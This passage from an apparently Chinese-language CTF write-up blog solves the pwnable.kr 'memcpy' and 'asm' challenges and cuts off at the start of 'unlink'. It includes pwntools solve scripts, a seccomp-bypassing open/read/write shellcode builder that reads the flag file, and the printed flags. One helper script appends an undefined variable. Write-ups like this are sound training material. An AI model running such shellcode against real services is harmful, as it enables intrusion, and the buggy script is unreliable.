class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">size_t</span> sizes[<span class="number">10</span>];</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// setup experiment parameters</span></span><br><span class="line">        <span class="keyword">for</span>(e=<span class="number">4</span>; e&lt;<span class="number">14</span>; e++)&#123;    <span class="comment">// 2^13 = 8K</span></span><br><span class="line">                low = <span class="built_in">pow</span>(<span class="number">2</span>,e<span class="number">-1</span>);</span><br><span class="line">                high = <span class="built_in">pow</span>(<span class="number">2</span>,e);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"specify the memcpy amount between %d ~ %d : "</span>, low, high);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;size);</span><br><span class="line">                <span class="keyword">if</span>( size &lt; low || size &gt; high )&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"don't mess with the experiment.\n"</span>);</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                sizes[i++] = size;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"ok, lets run the experiment with your configuration\n"</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// run experiment</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">                size = sizes[i];</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"experiment %d : memcpy with buffer size %d\n"</span>, i+<span class="number">1</span>, size);</span><br><span class="line">                dest = <span class="built_in">malloc</span>( size );</span><br><span class="line"></span><br><span class="line">                <span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);         <span class="comment">// to eliminate cache effect</span></span><br><span class="line">                t1 = rdtsc();</span><br><span class="line">                slow_memcpy(dest, src, size);           <span class="comment">// byte-to-byte memcpy</span></span><br><span class="line">                t2 = rdtsc();</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"ellapsed CPU cycles for slow_memcpy : %llu\n"</span>, t2-t1);</span><br><span class="line"></span><br><span class="line">                <span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);         <span class="comment">// to eliminate cache effect</span></span><br><span class="line">                t1 = rdtsc();</span><br><span class="line">                fast_memcpy(dest, src, size);           <span class="comment">// block-to-block memcpy</span></span><br><span class="line">                t2 = rdtsc();</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"ellapsed CPU cycles for fast_memcpy : %llu\n"</span>, t2-t1);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"thanks for helping my experiment!\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"flag : ----- erased in this source code -----\n"</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读完源码，题目大意是这样的。用户输入满足题目要求的10个数，然后用malloc依次申请用户输入数字大小(size)的内存，每次申请后分别用自定义函数<code>slow_memcpy</code>和<code>fast_memcpy</code>将另一个内存的数据拷贝到刚才申请的内存中去，大小为size。用<code>rdtsc</code>计时。</p><p>从整个流程来看，只要按要求输入了10个数字，最后总能拿到flag，那就先在题目规定范围内随便输一些数。</p><p><img src="https://i.imgur.com/6i6poyT.png" alt=""></p><p>遇到了段错误<font color="red">(<strong>SIGSEGV</strong>)</font></p><p>注意到是在movntps处停止的，没遇到过这个命令，查一下有什么用。</p><blockquote><p>Moves the double quadword in the source operand (second operand) to the destination operand (first operand) using a non-temporal hint to minimize cache pollution during the write to memory. The source operand is an XMM register, which is assumed to contain four packed single-precision floating-point values. The destination operand is a 128-bit memory location.</p></blockquote><p>感觉不是很能看懂，但是大意应该就是将xmm寄存器内的单精度浮点数据移动到m128寄存器。</p><blockquote><p>You should not access the __m128 fields directly. You can, however, see these types in the debugger. A variable of type __m128 maps to the XMM[0-7] registers.</p><p><strong>Variables of type __m128 are automatically aligned on 16-byte boundaries.</strong></p></blockquote><p>于是查了一下什么是m128：<a href="https://docs.microsoft.com/en-us/cpp/cpp/m128?view=vs-2017" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/cpp/cpp/m128?view=vs-2017</a></p><p>总结：<strong>类型为__m128的数据(大小为128字节)，分别对应映射到8个xmm寄存器XMM[0-7]，于是每个xmm寄存器大小为16字节(128bit),如下图。数据类型为__m128的变量需要16字节对齐。</strong></p><p><img src="https://i.imgur.com/HNTHCnD.png" alt=""></p><p>所以什么是对齐？</p><p>简单的说，同时对一组数据进行相同操作的技术称为<strong>SIMD</strong>(Single Instruction Multiple Data)，而执行SIMD指令要求数据的内存地址要和某个字节对齐(比如16字节对齐),这实际上意味着数据所在内存的地址需要被指令所需的字节数整除。</p><p>所以16字节对齐意思就是数据的内存地址要是16的整数倍，比如0x1230是16字节对齐，而0x1231没对齐。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x400863</span> &lt;fast_memcpy+<span class="number">37</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>+<span class="number">0xc</span>]<span class="comment">;src地址()</span></span><br><span class="line"><span class="number">0x400866</span> &lt;fast_memcpy+<span class="number">40</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>+<span class="number">0x8</span>]<span class="comment">;dest地址(需手动对齐)</span></span><br><span class="line"><span class="number">0x400869</span> &lt;fast_memcpy+<span class="number">43</span>&gt;:   <span class="keyword">movdqa</span> <span class="built_in">xmm0</span>,XMMWORD <span class="built_in">PTR</span> [<span class="built_in">eax</span>]<span class="comment">;</span></span><br><span class="line"><span class="number">0x40086d</span> &lt;fast_memcpy+<span class="number">47</span>&gt;:   <span class="keyword">movdqa</span> <span class="built_in">xmm1</span>,XMMWORD <span class="built_in">PTR</span> [<span class="built_in">eax</span>+<span class="number">0x10</span>]<span class="comment">;</span></span><br><span class="line"><span class="number">0x400872</span> &lt;fast_memcpy+<span class="number">52</span>&gt;:   <span class="keyword">movdqa</span> <span class="built_in">xmm2</span>,XMMWORD <span class="built_in">PTR</span> [<span class="built_in">eax</span>+<span class="number">0x20</span>]<span class="comment">;</span></span><br><span class="line"><span class="number">0x400877</span> &lt;fast_memcpy+<span class="number">57</span>&gt;:   <span class="keyword">movdqa</span> <span class="built_in">xmm3</span>,XMMWORD <span class="built_in">PTR</span> [<span class="built_in">eax</span>+<span class="number">0x30</span>]<span class="comment">;一次16字节，共4次，总共64字节大小数据从src存入xmm寄存器</span></span><br><span class="line"><span class="number">0x40087c</span> &lt;fast_memcpy+<span class="number">62</span>&gt;:   <span class="keyword">movntps</span> XMMWORD <span class="built_in">PTR</span> [<span class="built_in">edx</span>],<span class="built_in">xmm0</span><span class="comment">;</span></span><br><span class="line"><span class="number">0x40087f</span> &lt;fast_memcpy+<span class="number">65</span>&gt;:   <span class="keyword">movntps</span> XMMWORD <span class="built_in">PTR</span> [<span class="built_in">edx</span>+<span class="number">0x10</span>],<span class="built_in">xmm1</span><span class="comment">;</span></span><br><span class="line"><span class="number">0x400883</span> &lt;fast_memcpy+<span class="number">69</span>&gt;:   <span class="keyword">movntps</span> XMMWORD <span class="built_in">PTR</span> [<span class="built_in">edx</span>+<span class="number">0x20</span>],<span class="built_in">xmm2</span><span class="comment">;</span></span><br><span class="line"><span class="number">0x400887</span> &lt;fast_memcpy+<span class="number">73</span>&gt;:   <span class="keyword">movntps</span> XMMWORD <span class="built_in">PTR</span> [<span class="built_in">edx</span>+<span class="number">0x30</span>],<span class="built_in">xmm3</span><span class="comment">;再将xmm寄存器内的数据存入dest</span></span><br><span class="line"><span class="number">0x40088b</span> &lt;fast_memcpy+<span class="number">77</span>&gt;:   <span class="keyword">add</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>+<span class="number">0x8</span>],<span class="number">0x40</span><span class="comment">;</span></span><br><span class="line"><span class="number">0x40088f</span> &lt;fast_memcpy+<span class="number">81</span>&gt;:   <span class="keyword">add</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>+<span class="number">0xc</span>],<span class="number">0x40</span><span class="comment">;src和dest分别递增64字节</span></span><br></pre></td></tr></table></figure><p>由于我们一开始的数据是随便输入的，所以导致程序运行过程中有没对齐的情况，触发了sigsecv。从上上图看到edx(0x404468)是dest地址，未对齐，所以程序中断。</p><p>现在题目就变成了构造输入的数字，使其地址16字节对齐。</p><p>dest的内存是由malloc分配的。设我们申请的内存空间为x字节，加上chunk头部8字节的控制信息，我们申请的空间大小为8+x字节，但是由于malloc分配的内存是8字节对齐的，所以我们申请的内存大小有可能不是8+x。但是我们只要控制我们申请的内存是16字节对齐的，那malloc的8字节对齐就不会对我们申请内存的大小造成影响，再控制取值范围在2的n次幂内，就可以找到答案。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">10</span></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(n):</span><br><span class="line">    <span class="keyword">if</span> int(x + <span class="number">8</span>) % <span class="number">16</span> == <span class="number">0</span> <span class="keyword">and</span> x &gt;= pow(<span class="number">2</span>, <span class="number">10</span>-n+<span class="number">3</span>):</span><br><span class="line">        print(x)</span><br><span class="line">        n = n<span class="number">-1</span></span><br><span class="line">    x = x+<span class="number">1</span></span><br></pre></td></tr></table></figure><p>得到的结果为<strong>8,24,40,72,136,264,520,1032,2056,4104</strong>。</p><p>ssh连接服务器后nc 0 9022，在/tmp/目录下创建解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">amt</span><span class="params">()</span>:</span></span><br><span class="line">    n = <span class="number">10</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    l = []</span><br><span class="line">    <span class="keyword">while</span>(n):</span><br><span class="line">        <span class="keyword">if</span> int(x + <span class="number">8</span>) % <span class="number">16</span> == <span class="number">0</span> <span class="keyword">and</span> x &gt;= pow(<span class="number">2</span>, <span class="number">10</span>-n+<span class="number">3</span>):</span><br><span class="line">            l.append(a)</span><br><span class="line">            n = n<span class="number">-1</span></span><br><span class="line">        x = x+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> l</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'127.0.0.1'</span>,<span class="number">9022</span>)</span><br><span class="line"><span class="keyword">print</span> (r.recv())</span><br><span class="line">ll = amt()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    r.sendline(str(ll[i]))</span><br><span class="line">    <span class="keyword">print</span> (r.recv())</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">4</span>)</span><br><span class="line">print(r.recv())</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">memcpy@ubuntu:/tmp$ python demacia.py</span><br><span class="line">[+] Opening connection to 127.0.0.1 on port 9022: Done</span><br><span class="line">Hey, I have a boring assignment for CS class.. :(</span><br><span class="line">The assignment is simple.</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">- What is the best implementation of memcpy?        -</span><br><span class="line">- 1. implement your own slow/fast version of memcpy -</span><br><span class="line">- 2. compare them with various size of data         -</span><br><span class="line">- 3. conclude your experiment and submit report     -</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">This time, just help me out with my experiment and get flag</span><br><span class="line"></span><br><span class="line">No fancy hacking, I promise :D</span><br><span class="line">specify the memcpy amount between 8 ~ 16 :</span><br><span class="line">specify the memcpy amount between 16 ~ 32 :</span><br><span class="line">specify the memcpy amount between 32 ~ 64 :</span><br><span class="line">specify the memcpy amount between 64 ~ 128 :</span><br><span class="line">specify the memcpy amount between 128 ~ 256 :</span><br><span class="line">specify the memcpy amount between 256 ~ 512 :</span><br><span class="line">specify the memcpy amount between 512 ~ 1024 :</span><br><span class="line">specify the memcpy amount between 1024 ~ 2048 :</span><br><span class="line">specify the memcpy amount between 2048 ~ 4096 :</span><br><span class="line">specify the memcpy amount between 4096 ~ 8192 :</span><br><span class="line">ok, lets run the experiment with your configuration</span><br><span class="line">experiment 1 : memcpy with buffer size 8</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 1596</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 378</span><br><span class="line"></span><br><span class="line">experiment 2 : memcpy with buffer size 24</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 429</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 429</span><br><span class="line"></span><br><span class="line">experiment 3 : memcpy with buffer size 40</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 606</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 657</span><br><span class="line"></span><br><span class="line">experiment 4 : memcpy with buffer size 72</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 1020</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 273</span><br><span class="line"></span><br><span class="line">experiment 5 : memcpy with buffer size 136</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 2028</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 297</span><br><span class="line"></span><br><span class="line">experiment 6 : memcpy with buffer size 264</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 3618</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 288</span><br><span class="line"></span><br><span class="line">experiment 7 : memcpy with buffer size 520</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 7038</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 336</span><br><span class="line"></span><br><span class="line">experiment 8 : memcpy with buffer size 1032</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 13887</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 483</span><br><span class="line"></span><br><span class="line">experiment 9 : memcpy with buffer size 2056</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 27555</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 798</span><br><span class="line"></span><br><span class="line">experiment 10 : memcpy with buffer size 4104</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 56943</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 1650</span><br><span class="line"></span><br><span class="line">thanks for helping my experiment!</span><br><span class="line">flag : 1_w4nn4_br34K_th3_m3m0ry_4lignm3nt</span><br><span class="line"></span><br><span class="line">[*] Closed connection to 127.0.0.1 port 9022</span><br><span class="line">memcpy@ubuntu:/tmp$</span><br></pre></td></tr></table></figure><p>拿到flag</p><p>参考资料：</p><p><a href="https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-optimization-manual.pdf" target="_blank" rel="noopener">64-ia-32-architectures-optimization-manual</a></p><p><a href="https://en.wikipedia.org/wiki/SIMD" target="_blank" rel="noopener">SIMD</a></p><p><a href="https://stackoverflow.com/questions/10224564/what-does-alignment-to-16-byte-boundary-mean-in-x86" target="_blank" rel="noopener">what-does-alignment-to-16-byte-boundary-mean-in-x86</a></p><h2 id="asm"><a href="#asm" class="headerlink" title="asm"></a>asm</h2><p>题目：<strong>ssh -p2222 <a href="mailto:asm@pwnable.kr" target="_blank" rel="noopener">asm@pwnable.kr</a> (pw:guest)</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LENGTH 128</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sandbox</span><span class="params">()</span></span>&#123;</span><br><span class="line">scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);</span><br><span class="line"><span class="keyword">if</span> (ctx == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"seccomp error\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), <span class="number">0</span>);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">0</span>);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="number">0</span>);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(<span class="built_in">exit</span>), <span class="number">0</span>);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (seccomp_load(ctx) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">seccomp_release(ctx);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"seccomp error\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">seccomp_release(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> stub[] = <span class="string">"\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> filter[<span class="number">256</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome to shellcoding practice challenge.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"If this does not challenge you. you should play 'asg' challenge :)\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* sh = (<span class="keyword">char</span>*)mmap(<span class="number">0x41414000</span>, <span class="number">0x1000</span>, <span class="number">7</span>, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">memset</span>(sh, <span class="number">0x90</span>, <span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(sh, stub, <span class="built_in">strlen</span>(stub));</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> offset = <span class="keyword">sizeof</span>(stub);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"give me your x64 shellcode: "</span>);</span><br><span class="line">read(<span class="number">0</span>, sh+offset, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">alarm(<span class="number">10</span>);</span><br><span class="line">chroot(<span class="string">"/home/asm_pwn"</span>);<span class="comment">// you are in chroot jail. so you can't use symlink in /tmp</span></span><br><span class="line">sandbox();</span><br><span class="line">((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))sh)();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题让我们输入shellcode，读取当前目录下的flag文件。</p><p>我们输入的shellcode作为整个shellcode的一部分拼接到stub后面，所以看看stub都写了什么。</p><p><img src="https://i.imgur.com/iXSs7Ry.png" alt=""></p><p>帮我们把寄存器都清零了，对我们将要写的shellcode也没什么影响，不用管</p><p><code>sandbox</code>函数中的<code>seccomp</code>之前遇到过，是让进程进入安全模式，通过<code>seccomp_rule_add</code>限定了只能进行<code>open</code>,<code>read</code>,<code>write</code>,<code>exit</code>,<code>exit_group</code>这几个系统调用。</p><p>所以思路就是用<code>open</code>打开flag文件，<code>read</code>读取内容，<code>write</code>输出到屏幕。</p><p>这次flag文件名那么长，肯定不能像上次一样手写汇编代码了，所以用到了pwnlib下的<a href="http://docs.pwntools.com/en/stable/shellcraft/amd64.html" target="_blank" rel="noopener">shellcraft子模块</a>。(其实一开始真的是打算手写汇编代码的，以为<code>open</code>的文件名参数可以用通配符来指代，后面发现不行。。)</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = ssh(host=<span class="string">'pwnable.kr'</span>, user=<span class="string">'asm'</span>, port=<span class="number">2222</span>, password=<span class="string">'guest'</span>)</span><br><span class="line">c = s.connect_remote(<span class="string">'127.0.0.1'</span>, <span class="number">9026</span>)</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">''</span></span><br><span class="line">shellcode += shellcraft.open(<span class="string">'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">'rax'</span>, <span class="string">'rsp'</span>, <span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, <span class="string">'rsp'</span>, <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (c.recv())</span><br><span class="line">c.sendline(asm(shellcode))</span><br><span class="line">print(c.recvline())</span><br></pre></td></tr></table></figure><p>拿到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[+] Connecting to pwnable.kr on port 2222: Done</span><br><span class="line">[*] asm@pwnable.kr:</span><br><span class="line">    Distro    Ubuntu 16.04</span><br><span class="line">    OS:       linux</span><br><span class="line">    Arch:     amd64</span><br><span class="line">    Version:  4.10.0</span><br><span class="line">    ASLR:     Enabled</span><br><span class="line">[+] Connecting to 127.0.0.1:9026 via SSH to pwnable.kr: Done</span><br><span class="line">Welcome to shellcoding practice challenge.</span><br><span class="line">In this challenge, you can run your x64 shellcode under SECCOMP sandbox.</span><br><span class="line">Try to make shellcode that spits flag using open()/read()/write() systemcalls only.</span><br><span class="line">If this does not challenge you. you should play &apos;asg&apos; challenge :)</span><br><span class="line">give me your x64 shellcode:</span><br><span class="line">Mak1ng_shelLcodE_i5_veRy_eaSy</span><br><span class="line"></span><br><span class="line">[*] Closed remote connection to 127.0.0.1:9026 via SSH connection to pwnable.kr</span><br></pre></td></tr></table></figure></p><p>参考：</p><p><a href="blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a></p><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>题目：<strong>ssh -p2222 <a href="mailto:unlink@pwnable.kr" target="_blank" rel="noopener">unlink@pwnable.kr</a> (pw:guest)</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 